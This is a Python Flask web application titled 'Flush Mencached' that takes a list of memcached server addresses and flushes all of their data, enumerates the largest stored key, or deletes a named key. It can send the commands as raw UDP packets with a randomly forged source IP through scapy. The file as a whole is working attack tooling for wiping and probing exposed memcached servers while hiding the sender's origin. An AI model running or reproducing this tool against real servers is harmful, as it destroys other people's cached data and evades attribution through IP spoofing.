from scapy.all import *
import memcache
from flask import request
from flask import Flask
import random
import socket
import struct
import string

app = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])
def hello():
    html = '<title>Flush Mencached</title><h1>Flush Mencached</h1><form action="/" method="POST">Please input IP address(IP:PORT):<br><textarea name="data" rows="20" cols="22"></textarea><br>TODO:<input type="radio" name="todo" value="flushall">Flush ALL <input type="radio" name="todo" value="getkey">Get memc key <input type="radio" name="todo" value="delkey">Delete Key<input type="text" name="memckey"><br>SRC IP:<input type="radio" name="srcip" value="forgedip">Forged IP <input type="radio" name="srcip" value="nativeip" checked>Native IP<br><br><input type="submit" value="Submit"></form>'
    if request.method == 'POST':
        if request.form['todo']=='flushall':
            return html + '<br>--------<br>' + flushmemc(request.form['data'],request.form['srcip'])
        elif request.form['todo']=='getkey':
            return html + '<br>--------<br>' + getmemckeylist(request.form['data'],request.form['srcip'])
        elif request.form['todo']=='delkey':
            return html + '<br>--------<br>' + delmemckey(request.form['data'],request.form['memckey'],request.form['srcip'])
        else:
            return html
    else:
        return html

def flushmemc(data,srcip):
    addresslist = data.split('\r\n')
    result = ''
    memccmd = '\x00\x00\x00\x00\x00\x01\x00\x00flush_all\r\n'
    for address in addresslist:
        if string.find(address,':')==-1:
            break
        if srcip=='forgedip':
            iplist = address.split(':')
            srcip = randomip()
            pkt = IP(src=srcip, dst=iplist[0])/UDP(sport=12345, dport=int(iplist[1]))/memccmd
            send(pkt, inter=1, count=1)
            result = result + address + ':OK<br>'
        else:
            try:
                mc = memcache.Client([address], debug=0)
                mc.flush_all()
                result = result + address + ':OK<br>'
            except:
                result = result + address + ':connection error<br>'
    return result

def getmemckeylist(data,srcip):
    addresslist = data.split('\r\n')
    result = ''
    for address in addresslist:
        if string.find(address,':')==-1:
            break
        memckey=getmemckey(address)
        if getmemckey(address)=='connection error':
            result = result + address + ' ' + memckey + '<br>'
        elif getmemckey(address)=='':
            result = result + address + ' do not have any key<br>'
        else:
            result = result + address + ' max size key is:' + memckey + '<br>'
    return result

def getmemckey(ipaddress):
    try:
        mc = memcache.Client([ipaddress], debug=0)
        items_list=mc.get_stats('items')
        itemid_list=[]
        for items_data in items_list[0][1].items():
            item_list=items_data[0].split(':')
            if item_list[1] not in itemid_list:
                itemid_list.append(item_list[1])
        max_size=0
        max_size_key=''
        for itemid in itemid_list:
            datas=mc.get_stats('cachedump ' + itemid +' 0')
            for data in datas[0][1].items():
                data_key=data[0]
                data_size=int(data[1].split(' ')[0][1:])
                if data_size>max_size:
                    max_size=data_size
                    max_size_key=data_key
        return max_size_key
    except:
        return 'connection error'

def delmemckey(data,key,srcip):
    addresslist = data.split('\r\n')
    result = ''
    if srcip=='forgedip':
        memccmd = str('\x00\x00\x00\x00\x00\x01\x00\x00delete ' + '%s' % (key) + '\r\n')
        for address in addresslist:
            if string.find(address,':')==-1:
                break
            iplist = address.split(':')
            srcip = randomip()
            pkt = IP(src=srcip, dst=iplist[0])/UDP(sport=12345, dport=int(iplist[1]))/memccmd
            send(pkt, inter=1, count=1)
            result = result + address + ':OK<br>'
        return result
    else:
        for address in addresslist:
            if string.find(address,':')==-1:
                break
            try:
                mc = memcache.Client([address], debug=0)
                if mc.delete(key):
                    result = result + address + ':OK<br>'
                else:
                    result = result + address + ':connection error<br>'
            except:
                result = result + address + ':connection error<br>'
        return result
        
            

def randomip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
